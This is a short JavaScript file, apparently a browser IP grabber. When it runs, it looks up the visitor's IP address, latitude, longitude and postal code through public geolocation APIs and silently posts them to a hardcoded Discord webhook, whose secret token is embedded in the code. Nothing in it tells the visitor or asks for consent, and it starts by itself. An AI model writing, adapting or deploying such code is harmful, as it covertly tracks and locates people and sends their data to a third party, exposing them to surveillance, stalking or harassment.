// Function to get the user's IP address
async function getUserIPAddress() {
  try {
    console.debug('Fetching user IP address...');
    const response = await fetch('https://api.ipify.org?format=json');
    if (!response.ok) {
      throw new Error(`ipify API HTTP error ${response.status}`);
    }
    const data = await response.json();
    console.debug('IP address received:', data.ip);
    return data.ip;
  } catch (error) {
    console.error('Error getting IP address:', error);
    return 'Unknown';
  }
}

// Function to get the user's coordinates
async function getUserCoordinates() {
  try {
    console.debug('Fetching user coordinates...');
    const response = await fetch('https://ipapi.co/json/');
    if (!response.ok) {
      throw new Error(`ipapi.co API HTTP error ${response.status}`);
    }
    const data = await response.json();
    console.debug('Coordinates received:', { latitude: data.latitude, longitude: data.longitude });
    return {
      latitude: data.latitude ?? 'Unknown',
      longitude: data.longitude ?? 'Unknown'
    };
  } catch (error) {
    console.error('Error getting coordinates:', error);
    return { latitude: 'Unknown', longitude: 'Unknown' };
  }
}

// Function to get the user's postal code
async function getUserPostalCode() {
  try {
    console.debug('Fetching user postal code...');
    const response = await fetch('https://ipapi.co/json/');
    if (!response.ok) {
      throw new Error(`ipapi.co API HTTP error ${response.status}`);
    }
    const data = await response.json();
    console.debug('Postal code received:', data.postal);
    return data.postal ?? 'Unknown';
  } catch (error) {
    console.error('Error getting postal code:', error);
    return 'Unknown';
  }
}

// Function to send the information to the Discord webhook
async function sendToDiscordWebhook(ipAddress, coordinates, postalCode) {
  try {
    console.debug('Sending data to Discord webhook...');
    const webhookUrl = 'https://discord.com/api/webhooks/1402759827490340925/z-DDNtNjRZV-ODD7afwZQsfRaJKZKJPkA126OHF8NgfTt9nC8reIUp6LUpiplz3HfpN9';

    // Construct message content neatly formatted for Discord
    const messageContent = `
**User Information:**
- IP Address: \`${ipAddress}\`
- Coordinates: Latitude: \`${coordinates.latitude}\`, Longitude: \`${coordinates.longitude}\`
- Postal Code: \`${postalCode}\`
    `;

    const payload = { content: messageContent.trim() };

    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    if (!response.ok) {
      throw new Error(`Discord webhook HTTP error ${response.status}`);
    }
    console.debug('Data sent to Discord successfully.');
  } catch (error) {
    console.error('Error sending to Discord webhook:', error);
  }
}

// Main function to retrieve and send the information
async function sendUserInfoToDiscord() {
  try {
    console.info('Starting process to gather and send user info...');

    const ipAddress = await getUserIPAddress();
    const coordinates = await getUserCoordinates();
    const postalCode = await getUserPostalCode();

    console.info('All user info gathered:', { ipAddress, coordinates, postalCode });

    await sendToDiscordWebhook(ipAddress, coordinates, postalCode);

    console.info('User information sent to Discord webhook successfully.');
  } catch (error) {
    console.error('Error sending user information to Discord:', error);
  }
}

// Kick off the process
sendUserInfoToDiscord();
